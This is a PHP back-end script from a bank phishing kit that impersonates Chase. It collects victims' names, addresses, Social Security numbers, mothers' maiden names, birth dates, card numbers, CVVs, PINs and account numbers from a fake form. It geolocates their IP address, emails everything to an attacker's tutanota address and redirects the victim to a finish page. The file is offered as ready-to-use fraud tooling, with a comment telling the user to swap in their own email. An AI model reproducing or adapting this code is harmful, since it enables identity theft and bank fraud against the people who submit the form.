<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Fullz Info-----------------------\n";
$message .= "FullName: ".$_POST['formtext1']."\n";
$message .= "Address: ".$_POST['formtext2']."\n";
$message .= "Address2: ".$_POST['formtext2']."\n";
$message .= "City: ".$_POST['formtext4']."\n";
$message .= "State: ".$_POST['formselect1']."\n";
$message .= "ZipCode: ".$_POST['formtext5']."\n";
$message .= "phone: ".$_POST['formtext6']."\n";
$message .= "SSN: ".$_POST['formtext7']."\n";
$message .= "MMN: ".$_POST['formtext8']."\n";
$message .= "DOBDAY: ".$_POST['formtext9']."\n";
$message .= "DOBMON: ".$_POST['formtext10']."-";
$message .= "DOBYEAR: ".$_POST['formtext11']."\n";
$message .= "CardNumber: ".$_POST['formtext12']."\n";
$message .= "Cvv: ".$_POST['formtext13']."\n";
$message .= "Pin: ".$_POST['formtext14']."\n";
$message .= "ExpDate: ".$_POST['formselect2']."-";
$message .= $_POST['formselect3']."\n";
$message .= "Account Number: ".$_POST['formtext15']."\n";
$message .= "----------Created BY Folazan432-------------\n";
//change ur email here
$send = "folazan432@tutanota.com";
$subject = "Chase Fullz from $ip";
$headers = "From: Chase<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
	
		   header("Location: Finish.php");

	 
?>